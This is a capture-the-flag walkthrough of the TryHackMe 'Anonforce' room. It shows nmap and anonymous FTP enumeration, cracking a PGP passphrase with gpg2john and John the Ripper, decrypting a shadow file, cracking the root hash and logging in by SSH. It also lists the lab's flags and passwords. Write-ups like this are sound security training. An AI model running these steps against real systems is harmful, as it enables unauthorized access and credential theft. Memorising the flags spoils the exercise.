---
title: "Anonforce"
description: "A boot2root CTF machine focusing on anonymous FTP access, PGP private key cracking, and privilege escalation to root."
difficulty: "Easy"
tags: ["FTP", "PGP", "Privilege Escalation", "Cryptography"]
date: "2026-07-04"
---

## Overview

Anonforce is a TryHackMe boot2root machine from the FIT & BSides Guatemala CTF. The target exposes an FTP server with anonymous login enabled, which grants access to the entire filesystem. Inside, a misconfigured directory contains a PGP private key and an encrypted backup. Cracking the key's passphrase reveals the system shadow file, and cracking the root hash provides full administrative access.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Skills Learned:** FTP enumeration, PGP/GPG cracking, Linux privilege escalation

## Enumeration

### Nmap Scan

Started with an nmap scan to identify open ports and running services:

```bash
nmap -sV -sC -oN nmap.txt 10.49.137.47
```

![Nmap scan results showing FTP and SSH](/assets/screenshots/anonforce/nmap.png)

The scan revealed two open ports:

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | FTP | vsftpd 3.0.3 |
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu |

The FTP server had anonymous login enabled, which immediately stood out as the attack vector.

### Anonymous FTP Access

Connected to the FTP server without credentials:

```bash
ftp 10.49.137.47
# username: anonymous
# password: (blank)
```

The FTP server exposed the entire root filesystem — a severe misconfiguration. The directory listing showed the complete Linux filesystem structure including `/home`, `/etc`, `/root`, and an unusual directory `/notread`.

## Initial Access — User Flag

Navigated to the home directory of user `melodias`:

```bash
cd /home/melodias
get user.txt
```

**User flag:** `606083fd33beb1284fc51f411a706af8`

## Privilege Escalation

### Discovering Sensitive Files

While exploring the filesystem via FTP, the `/notread` directory stood out. It contained two files:

![FTP notread directory listing](/assets/screenshots/anonforce/ftp_notread.png)

| File | Description |
|------|-------------|
| `private.asc` | PGP private key (passphrase-protected) |
| `backup.pgp` | PGP encrypted backup file |

Downloaded both to the attack machine:

```bash
cd /notread
get private.asc
get backup.pgp
```

### Cracking the GPG Passphrase

The private key was encrypted with a passphrase. Used `gpg2john` to convert it into a format John the Ripper can process:

```bash
gpg2john private.asc > hash
```

![Private key content](/assets/screenshots/anonforce/private_asc.png)

This produced a hash JtR could crack. Ran John with the `rockyou.txt` wordlist:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![John the Ripper cracking the GPG passphrase](/assets/screenshots/anonforce/john_hashcat.png)

The passphrase cracked almost instantly: **`xbox360`**

### Decrypting the Backup

Imported the private key into the local GPG keyring:

```bash
gpg --import private.asc
# Enter passphrase: xbox360
```

Decrypted the backup file:

```bash
gpg --decrypt backup.pgp
```

The decrypted output revealed the system's `/etc/shadow` file, containing password hashes for all users. The root hash was a SHA-512 hash (`$6$` prefix):

```
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
```

### Cracking the Root Hash

Saved the root hash to a file and cracked it with John:

```bash
john shadow --wordlist=/usr/share/wordlists/rockyou.txt
```

**Root password:** `hikari`

### SSH as Root

Logged in via SSH with the cracked credentials:

```bash
ssh root@10.49.137.47
# password: hikari
```

### Root Flag

Once logged in as root, retrieved the final flag:

```bash
cat /root/root.txt
```

![Root flag captured](/assets/screenshots/anonforce/root_flag.png)

**Root flag:** `f706456440c7af4187810c31c6cebdce`

## Flags

| Flag | Value |
|------|-------|
| User | `606083fd33beb1284fc51f411a706af8` |
| Root | `f706456440c7af4187810c31c6cebdce` |

## Commands Used

```bash
nmap -sV -sC -oN nmap.txt <target-ip>
ftp <target-ip>
gpg2john private.asc > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
gpg --import private.asc
gpg --decrypt backup.pgp
john shadow --wordlist=/usr/share/wordlists/rockyou.txt
ssh root@<target-ip>
```

## Lessons Learned

- **Anonymous FTP is dangerous** when it exposes the full filesystem. Always restrict anonymous users to a dedicated chroot jail.
- **PGP private keys** must be stored securely with strong passphrases. A weak passphrase like `xbox360` can be cracked in seconds with a standard wordlist.
- **Defense in depth** matters — even if an attacker gains access to encrypted files, strong passphrases and key management practices can prevent complete compromise.
- **John the Ripper's `gpg2john`** tool seamlessly converts GPG keys into a crackable format, making weak PGP passphrases trivially reversible.

## References

- [TryHackMe — Anonforce](https://tryhackme.com/room/bsidesgtanonforce)
- [John the Ripper](https://www.openwall.com/john/)
- [GNU Privacy Guard](https://gnupg.org/)
